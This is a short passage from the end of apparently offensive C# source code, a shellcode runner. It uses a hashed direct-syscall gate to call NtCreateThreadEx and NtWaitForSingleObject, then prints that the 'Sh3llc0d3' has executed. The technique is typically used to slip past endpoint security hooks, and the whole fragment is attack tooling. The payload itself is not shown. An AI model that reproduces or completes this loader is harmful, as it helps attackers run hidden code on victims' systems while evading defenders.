        NTCTE(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, createFlags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
        
        Console.WriteLine("[+] Thread created with handle {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));

        sysgate.Gate(NTWFSOHash);
        NTWFSO(threadHandle, false, 0);
    }
}